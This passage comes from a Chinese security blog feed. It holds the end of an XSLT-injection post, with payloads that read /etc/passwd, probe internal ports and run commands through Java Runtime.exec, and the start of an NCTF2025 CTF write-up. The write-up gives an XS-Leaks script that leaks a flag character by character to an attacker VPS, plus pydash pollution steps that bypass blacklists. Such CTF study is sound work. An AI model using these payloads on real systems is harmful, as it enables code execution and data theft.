<span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;/etc/passwd&#x27;)&quot;</span>/&gt;</span><br>    Fruits:<br>        <span class="hljs-comment">&lt;!-- Loop for each fruit --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:for-each</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;fruit&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- Print name: description --&gt;</span><br>      - <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;name&quot;</span>/&gt;</span>: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;description&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:for-each</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也可以端口探测</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;http://172.16.132.1:25&#x27;)&quot;</span>/&gt;</span><br>    Fruits:<br>        <span class="hljs-comment">&lt;!-- Loop for each fruit --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:for-each</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;fruit&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- Print name: description --&gt;</span><br>      - <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;name&quot;</span>/&gt;</span>: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;description&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:for-each</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="rce"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>这一部分是比较重要的了，它可以任意命令执行</p><p>xslt处理器如果不禁用，能将本机的java语言方法暴露为XSLT函数，导致任意代码执行漏洞</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:rt</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rtobject&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;rt:getRuntime()&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;process&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;rt:exec($rtobject,&#x27;ls&#x27;)&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;processString&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ob:toString($process)&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$processString&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>执行逻辑解释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt;：创建了一个变量rtobject，它调用Runtime.getRuntime()方法来获取当前Java应用程序的运行时环境。<br><br>&lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,&#x27;ls&#x27;)&quot;/&gt;：创建了一个变量process，它调用Runtime.exec()方法来执行系统命令ls（在Unix/Linux系统中列出目录内容）。<br><br>&lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt;：创建了一个变量processString，它将process对象转换为字符串。<br><br>&lt;xsl:value-of select=&quot;$processString&quot;/&gt;：输出processString变量的值，即ls命令的输出结果。<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://h4cking2thegate.github.io/posts/48198/#PKCS9Attributes">https://h4cking2thegate.github.io/posts/48198/#PKCS9Attributes</a></p><p><a href="https://xz.aliyun.com/t/11732?u_atoken=2f8cf1aa195092bd55fd48ca5c229089&u_asig=1a0c39d517326969518455856e0045">https://xz.aliyun.com/t/11732?u_atoken=2f8cf1aa195092bd55fd48ca5c229089&amp;u_asig=1a0c39d517326969518455856e0045</a></p><p><a href="https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&u_asig=0a472f5217326934441316160e013b">https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&amp;u_asig=0a472f5217326934441316160e013b</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;水一下博客，之前这篇写在本地了，现在放到博客方便用的时候看，因为前面nacos的时候用到了一些&lt;/p&gt;
&lt;p&gt;这两条链子都是基于原生jdk的，不需要其他依赖&lt;/p&gt;
&lt;h1 id=&quot;multiuidefaults利用链&quot;&gt;&lt;a href=&quot;#MultiUIDefaults利</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2025复现</title>
    <link href="https://clowsman.github.io/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-26T14:23:32.000Z</published>
    <updated>2025-03-26T14:27:53.633Z</updated>
    
    <content type="html"><![CDATA[<p>当时没怎么打，现在来复现一下，也是学到蛮多东西</p><h1 id="internal_api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h1><p>一个新学到的XSLeak侧信道攻击</p><p>参考文章：<a href="https://ek1ng.com/XSLeaks%20%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB.html%EF%BC%8Chttps://wiki.scuctf.com/ctfwiki/web/9.xss/xsleaks/">https://ek1ng.com/XSLeaks%20%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB.html，https://wiki.scuctf.com/ctfwiki/web/9.xss/xsleaks/</a></p><p><strong>XSLeaks是什么</strong></p><p>XS-Leaks 全称 Cross-site leaks，可以用来 <strong>探测用户敏感信息</strong>。</p><p>利用方式、利用条件等都和 csrf 较为相似。</p><p>说到探测用户敏感信息，是如何进行探测的？和csrf 相似在哪？</p><p>设想网站存在一个模糊查找功能（若前缀匹配则返回对应结果）例如 <code>http://localhost/search?query=</code>，页面是存在 xss 漏洞，并且有一个类似 flag 的字符串，并且只有不同用户查询的结果集不同。这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。</p><p>虽然无法获取响应的内容，但是是否查找成功可以通过一些侧信道来判断。通过哪些侧信道判断呢？</p><p>这些侧信道的来源通常有以下几类：</p><ol><li>浏览器的 api (e.g. <a href="https://xsleaks.dev/docs/attacks/frame-counting/">Frame Counting</a> and <a href="https://xsleaks.dev/docs/attacks/timing-attacks/">Timing Attacks</a>)</li><li>浏览器的实现细节和bugs (e.g. <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">Connection Pooling</a> and <a href="https://xsleaks.dev/docs/attacks/historical/content-type/#typemustmatch">typeMustMatch</a>)</li><li>硬件bugs (e.g. Speculative Execution Attacks <a href="https://xsleaks.dev/#fn:4">4</a>)</li></ol><p>通过测信道攻击可以获取到用户隐私信息。</p><p>给了两个提示</p><p><img src="https://cdn.clown2024.cn/image-20250323214108405.png" alt="image-20250323214108405"></p><p>search成功状态码为200，失败为500</p><p>审计源码，flag在数据库，然后被设置为隐藏</p><p><img src="https://cdn.clown2024.cn/image-20250323215259076.png" alt="image-20250323215259076"></p><p>然后只有bot可以去访问隐藏的flag</p><p>所以整体思路就是bot访问执行js代码的poc然后盲注flag带出来给攻击者</p><p><del>但是卧槽为什么啊，我不理解为什么exp会打不通</del></p><p>找到原因了，没看到object.data是火狐才有的了，他的bot是chrome的，得改成script，看gm7佬的文章有写，以前没细看麻了：<a href="https://gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/20.xs-leaks/?h=script#%E4%BB%80%E4%B9%88%E6%98%AFxs-leaks">https://gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/20.xs-leaks/?h=script#%E4%BB%80%E4%B9%88%E6%98%AFxs-leaks</a></p><p>最终exp</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VPS_IP</span> = <span class="hljs-string">&#x27;http://43.139.107.213:1389&#x27;</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> chars = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">escape</span> = (<span class="hljs-params">c</span>) =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">oracle</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// const object = document.createElement(&quot;object&quot;);</span></span><br><span class="language-javascript">            <span class="hljs-comment">// object.data = url;</span></span><br><span class="language-javascript">            <span class="hljs-comment">// object.onload = resolve;</span></span><br><span class="language-javascript">            <span class="hljs-comment">// object.onerror = reject;  </span></span><br><span class="language-javascript">            <span class="hljs-comment">// document.head.appendChild(object);</span></span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">            script.<span class="hljs-property">src</span> = url;</span><br><span class="language-javascript">            script.<span class="hljs-property">onload</span> = resolve;</span><br><span class="language-javascript">            script.<span class="hljs-property">onerror</span> = reject;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">search</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">await</span> <span class="hljs-title function_">oracle</span>(url)</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    (<span class="hljs-keyword">async</span> () =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;nctf&#123;&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://127.0.0.1:8000/internal/search?s=<span class="hljs-subst">$&#123;flag&#125;</span>`</span></span><br><span class="language-javascript">        <span class="hljs-keyword">while</span> (flag.<span class="hljs-title function_">charAt</span>(flag.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) !== <span class="hljs-string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> chars ) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> ( <span class="hljs-title function_">await</span>(<span class="hljs-title function_">search</span>(url + <span class="hljs-built_in">escape</span>(i))) ) &#123;</span><br><span class="language-javascript">                url = url + <span class="hljs-built_in">escape</span>(i)</span><br><span class="language-javascript">                flag += i</span><br><span class="language-javascript">                <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;VPS_IP&#125;</span>/?flag=<span class="hljs-subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>&#125;)</span><br><span class="language-javascript">                <span class="hljs-keyword">break</span>;</span><br><span class="language-javascript">        &#125;   <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324010628655.png" alt="image-20250324010628655"></p><h1 id="ez_dash_revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h1><p>又是pydash的原型链污染，尝试了半天绕不过黑名单，也找不到污染的点</p><p>源码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Hints: Flag在环境变量中</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><br><br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-keyword">import</span> bottle<br><br><span class="hljs-comment"># for i in dir(pydash):</span><br><span class="hljs-comment">#     print(&quot;============================================&quot;)</span><br><span class="hljs-comment">#     print(dir(i))</span><br><br><br>__forbidden_path__=[<span class="hljs-string">&#x27;__annotations__&#x27;</span>, <span class="hljs-string">&#x27;__call__&#x27;</span>, <span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;__closure__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__code__&#x27;</span>, <span class="hljs-string">&#x27;__defaults__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__dict__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__dir__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__ge__&#x27;</span>, <span class="hljs-string">&#x27;__get__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__gt__&#x27;</span>, <span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;__init_subclass__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__kwdefaults__&#x27;</span>, <span class="hljs-string">&#x27;__le__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__module__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>, <span class="hljs-string">&#x27;__new__&#x27;</span>, <span class="hljs-string">&#x27;__qualname__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__reduce__&#x27;</span>, <span class="hljs-string">&#x27;__reduce_ex__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>, <span class="hljs-string">&#x27;__setattr__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__sizeof__&#x27;</span>, <span class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__subclasshook__&#x27;</span>, <span class="hljs-string">&#x27;__wrapped__&#x27;</span>,<br>               <span class="hljs-string">&quot;Optional&quot;</span>,<span class="hljs-string">&quot;render&quot;</span><br>               ]<br>__forbidden_name__=[<br>    <span class="hljs-string">&quot;bottle&quot;</span><br>]<br>__forbidden_name__.extend(<span class="hljs-built_in">dir</span>(<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&quot;__builtins__&quot;</span>]))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setval</span>(<span class="hljs-params">name:<span class="hljs-built_in">str</span>, path:<span class="hljs-built_in">str</span>, value:<span class="hljs-built_in">str</span></span>)-&gt; <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>]:<br>    <span class="hljs-keyword">if</span> name.find(<span class="hljs-string">&quot;__&quot;</span>)&gt;=<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> __forbidden_name__:<br>        <span class="hljs-keyword">if</span> name==word:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> __forbidden_path__:<br>        <span class="hljs-keyword">if</span> path.find(word)&gt;=<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    obj=<span class="hljs-built_in">globals</span>()[name]<br>    <span class="hljs-keyword">try</span>:<br>        <br>        pydash.set_(obj,path,value) <span class="hljs-comment"># 漏洞点，obj为pydash，</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># print(dir(pydash))</span><br><br><span class="hljs-meta">@bottle.post(<span class="hljs-params"><span class="hljs-string">&#x27;/setValue&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_value</span>():<br>    name = bottle.request.query.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    path=bottle.request.json.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(path,<span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name)&gt;<span class="hljs-number">6</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(path)&gt;<span class="hljs-number">32</span>: <span class="hljs-comment"># name的长度小于等于6</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no&quot;</span><br>    value=bottle.request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-keyword">if</span> setval(name, path, value) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;no&quot;</span><br><br><span class="hljs-meta">@bottle.get(<span class="hljs-params"><span class="hljs-string">&#x27;/render&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>():<br>    path=bottle.request.query.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path)&gt;<span class="hljs-number">10</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker&quot;</span><br>    blacklist=[<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>] <br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker&quot;</span><br>    <span class="hljs-keyword">return</span> bottle.template(path)<br>bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>一开始的想法就是，因为name被限制为了6位，要不就从pydash，要不就从setval这两个地方入手，然乎path的globals和builtins是没有被ban的，然后想通过污染拿到bottle，然后去污染渲染的模板，但是找了半天还是找不到绕过的方法，直接globals根本拿不到bottle</p><p>后来看到别人的思路是先污染pydash回有漏洞的代码，此事在sanic也有记载，就是利用他的5.1.2版本的path解析漏洞来绕过</p><p><img src="https://cdn.clown2024.cn/image-20250324094415736.png" alt="image-20250324094415736"></p><p><del>也就是我们需要污染RE_PATH_KEY_DELIM这个正则模式回5.1.2的模式，然后来绕过黑名单的过滤</del></p><p>emmm去看一下源码，有漏洞的版本的正则和新的正则没区别啊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 5.1.2的正则<br>(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])<br># 新的正则<br>(?&lt;!\\)(?:\\\\)*\.|(\[-?\d+\])<br></code></pre></td></tr></table></figure><p>新版的代码解析逻辑</p><p><img src="https://cdn.clown2024.cn/image-20250324100700677.png" alt="image-20250324100700677"></p><p>然后我把正则拉出来测试了一下</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br>RE_PATH_KEY_DELIM = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[-?\d+\])&quot;</span>)<br><br><br>value=<span class="hljs-string">&quot;__init__.__globals__&quot;</span><br>value1 = <span class="hljs-string">&quot;__init__\\\\.__globals__&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value1))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value1))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324115755280.png" alt="image-20250324115755280"></p><p>这和sanic中的那个绕过没有任何改变啊</p><p>后来我干脆直接去试了一下到底直接改有什么问题，终于给我发现端倪了(原来他们指的漏洞是这个啊🥲)</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-keyword">from</span> pydash <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br>RE_PATH_KEY_DELIM = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[-?\d+\])&quot;</span>)<br><br>__forbidden_path__ = <span class="hljs-string">&quot;123&quot;</span><br>value=<span class="hljs-string">&quot;__globals__.__forbidden_path__&quot;</span><br>value1 = <span class="hljs-string">&quot;__init__\\\\.__globals__&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, RE_PATH_KEY_DELIM.split(value1))))<br><span class="hljs-built_in">print</span>(RE_PATH_KEY_DELIM.split(value1))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setval</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>instance = b()<br><span class="hljs-comment"># print(dir(instance.__init__.__class__.__globals__))</span><br>pydash.set_(setval,value,<span class="hljs-string">&quot;aaa&quot;</span>)<br><span class="hljs-built_in">print</span>(__forbidden_path__)<br></code></pre></td></tr></table></figure><p>在我测试能否直接修改forbidden_path的时候，他给我报了一个错误</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324144251613.png" alt="image-20250324144251613"></p><p>然后去翻源码</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324144325047.png" alt="image-20250324144325047"></p><p>那么我只要把这里给污染了不就可以了成功修改所有黑名单了吗，我先换一下5.1.2的pydash看是不是没有做这个限制</p><p><img src="https://cdn.clown2024.cn/image-20250324144505707.png" alt="image-20250324144505707"></p><p>果然，以前是没有做限制的，终于找到问题所在了，目标明确了这下</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(pydash.helpers.RESTRICTED_KEYS)<br></code></pre></td></tr></table></figure><p>这里可以拿到黑名单</p><p>然后污染pydash</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324145004433.png" alt="image-20250324145004433"></p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>那现在就可以去从setval将黑名单全部覆盖了</p><p><img src="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/CTF\Game\NCTF2025\assets\image-20250324145205642.png" 